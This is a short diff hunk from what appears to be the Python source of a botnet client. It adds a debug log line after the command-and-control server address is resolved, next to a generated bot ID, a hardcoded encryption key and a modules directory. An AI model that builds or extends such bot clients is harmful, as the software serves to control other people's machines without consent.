@@ -722,6 +722,7 @@ if __name__ == '__main__':
                 return resolved
 
             C2_SERVER = get_c2_address()
+            logger.debug(f"Initial control URL resolved to: {C2_SERVER}")
             BOT_ID = f"{platform.node()}-{os.getpid()}"
             ENCRYPTION_KEY = b'sixteen byte key'
             MODULES_DIR = 'MODULES'
